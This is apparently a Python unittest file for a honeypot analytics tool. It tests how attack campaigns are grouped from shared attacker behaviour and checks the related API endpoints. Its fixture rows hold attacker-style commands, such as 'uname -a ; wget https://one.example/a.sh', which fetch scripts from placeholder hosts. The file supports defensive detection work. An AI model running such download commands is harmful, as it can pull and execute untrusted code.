import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import pandas as pd
from fastapi.testclient import TestClient

from api.main import create_app
from src import analysis, database


def rows():
    return pd.DataFrame([
        {"session": "a1", "src_ip": "192.0.2.1", "start_time": "2026-01-01T10:00:00Z",
         "duration_sec": 8, "n_events": 5, "n_commands": 2, "n_failed_logins": 1,
         "avg_gap_sec": 2, "behavior": "Command Activity",
         "commands": "uname -a ; wget https://one.example/a.sh"},
        {"session": "b1", "src_ip": "198.51.100.2", "start_time": "2026-01-02T10:00:00Z",
         "duration_sec": 8, "n_events": 5, "n_commands": 2, "n_failed_logins": 1,
         "avg_gap_sec": 2, "behavior": "Command Activity",
         "commands": "uname -a ; wget https://two.example/b.sh"},
        {"session": "c1", "src_ip": "203.0.113.9", "start_time": "2026-01-01T11:00:00Z",
         "duration_sec": 2, "n_events": 1, "n_commands": 0, "n_failed_logins": 0,
         "avg_gap_sec": 0, "behavior": "Scanner", "commands": ""},
    ])


class TestCampaignCorrelation(unittest.TestCase):
    def test_shared_patterns_form_candidate_with_evidence(self):
        campaigns = analysis.correlate_attack_campaigns(rows())
        self.assertEqual(len(campaigns), 1)
        campaign = campaigns[0]
        self.assertEqual(campaign["member_ips"], ["192.0.2.1", "198.51.100.2"])
        self.assertEqual(campaign["attacker_count"], 2)
        self.assertEqual(campaign["label"], "Candidate Campaign")
        self.assertEqual(campaign["confidence_level"], "High")
        self.assertTrue(any(item["type"] == "command_pattern" for item in campaign["shared_indicators"]))
        self.assertIn("does not establish common ownership", campaign["explanation"])

    def test_unrelated_and_insufficient_evidence_are_not_grouped(self):
        data = rows().iloc[[0, 2]].copy()
        data.loc[data.index[1], "commands"] = "id"
        self.assertEqual(analysis.correlate_attack_campaigns(data), [])

    def test_download_tool_with_behavior_and_activity_is_corroborated(self):
        data = rows().iloc[:2].copy()
        data["commands"] = ["wget https://one.example/a", "wget https://two.example/b"]
        campaigns = analysis.correlate_attack_campaigns(data)
        self.assertEqual(len(campaigns), 1)
        self.assertTrue(any(item["type"] == "download_tool" for item in campaigns[0]["shared_indicators"]))
        self.assertTrue(any(item["type"] == "activity_timing" for item in campaigns[0]["shared_indicators"]))

    def test_order_independent_ids_and_results_and_empty_data(self):
        first = analysis.correlate_attack_campaigns(rows())
        second = analysis.correlate_attack_campaigns(rows().sample(frac=1, random_state=8))
        self.assertEqual(first, second)
        self.assertEqual(analysis.correlate_attack_campaigns(pd.DataFrame()), [])
        self.assertEqual(analysis.correlate_attack_campaigns(pd.DataFrame({"src_ip": [None]})), [])

    def test_api_list_detail_and_filter_conventions(self):
        with tempfile.TemporaryDirectory() as temp:
            db_path = Path(temp) / "api.db"
            database.init_db(reset=True, db_path=db_path)
            with database.get_connection(db_path) as connection:
                connection.execute(
                    "CREATE TABLE session_clusters (session TEXT, behavior TEXT)"
                )
            client = TestClient(create_app(db_path=db_path))
            source = rows()

            def filtered_load(filters, _db_path):
                result = source.copy()
                if filters.start:
                    result = result[pd.to_datetime(result.start_time).dt.date.astype(str) >= filters.start]
                if filters.end:
                    result = result[pd.to_datetime(result.start_time).dt.date.astype(str) <= filters.end]
                if filters.behaviors is not None:
                    result = result[result.behavior.isin(filters.behaviors)]
                return result

            with patch("api.service.load_sessions", side_effect=filtered_load):
                response = client.get("/api/campaigns", params={"start": "2026-01-02"})
                self.assertEqual(response.status_code, 200)
                self.assertEqual(response.json(), [])

                response = client.get("/api/campaigns", params={"behavior": "Command Activity"})
                self.assertEqual(response.status_code, 200)
                campaign = response.json()[0]
                self.assertNotIn("members", campaign)

                detail = client.get(f"/api/campaigns/{campaign['campaign_id']}",
                                    params={"behavior": "Command Activity"})
                self.assertEqual(detail.status_code, 200)
                self.assertEqual(len(detail.json()["members"]), 2)
                missing = client.get("/api/campaigns/not-a-campaign")
                self.assertEqual(missing.status_code, 404)


if __name__ == "__main__":
    unittest.main()
